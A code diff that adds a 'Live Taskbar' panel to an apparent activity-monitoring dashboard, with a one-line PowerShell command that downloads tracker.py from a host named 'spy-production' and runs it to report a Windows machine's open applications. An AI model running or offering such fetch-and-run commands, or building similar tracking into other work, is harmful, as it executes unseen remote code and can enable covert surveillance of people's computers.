@@ -80,6 +80,36 @@
         </div>
       </section>
 
+      <!-- Live Taskbar Applications (Updated every 3 seconds) -->
+      <section class="content-card live-taskbar-section" style="margin-bottom: 2rem; border: 1px solid rgba(59, 130, 246, 0.4); background: rgba(15, 23, 42, 0.85); box-shadow: 0 4px 20px rgba(59, 130, 246, 0.15);">
+        <div class="card-header table-header" style="border-bottom: 1px solid rgba(59, 130, 246, 0.25); padding-bottom: 0.75rem;">
+          <div style="display:flex; align-items:center; gap: 10px;">
+            <span class="live-dot" style="display:inline-block; width:12px; height:12px; border-radius:50%; background:#22c55e; box-shadow: 0 0 10px #22c55e;"></span>
+            <div>
+              <h3 style="margin:0; font-size: 1.15rem; color: #60a5fa;">🔴 Live Taskbar - Ứng Dụng Đang Mở (Cập nhật mỗi 3s)</h3>
+              <p class="section-sub" id="liveTaskbarSubtitle" style="margin-top:2px; font-size:0.85rem; color:#94a3b8;">
+                Hiển thị tất cả phần mềm đang chạy trên thanh Taskbar theo thời gian thực (real-time 3.0s)
+              </p>
+            </div>
+          </div>
+          <div style="display:flex; align-items:center; gap:10px;">
+            <span class="badge" id="liveMachineBadge" style="background:#1e3a8a; color:#93c5fd; padding:4px 10px; border-radius:6px; font-size:0.85rem;">💻 Đang chờ kết nối...</span>
+            <span class="badge" id="liveCountBadge" style="background:#065f46; color:#a7f3d0; padding:4px 10px; border-radius:6px; font-size:0.85rem;">0 tác vụ</span>
+            <span id="liveTimeBadge" style="font-size:0.8rem; color:#64748b;">--:--:--</span>
+          </div>
+        </div>
+
+        <div id="liveTaskbarList" style="padding: 1.25rem; display: grid; grid-template-columns: repeat(auto-fill, minmax(310px, 1fr)); gap: 14px;">
+          <div class="empty-state" style="grid-column: 1 / -1; text-align: center; color: #94a3b8; padding: 2.5rem 1rem;">
+            <p style="font-size: 1.1rem; margin-bottom: 8px;">⏳ Chưa có tín hiệu từ tracker</p>
+            <p style="font-size: 0.9rem; color: #64748b;">Chạy lệnh sau trên máy tính Windows để kết nối ngay lập tức:</p>
+            <code style="display:inline-block; margin-top:8px; padding:6px 12px; background:#1e293b; color:#38bdf8; border-radius:6px; font-size:0.85rem;">
+              cd $HOME; irm https://spy-production-8aaa.up.railway.app/tracker.py -OutFile tracker.py; python tracker.py
+            </code>
+          </div>
+        </div>
+      </section>
+
       <!-- Charts Section -->
       <section class="charts-row">
         <!-- Hourly Activity Timeline -->
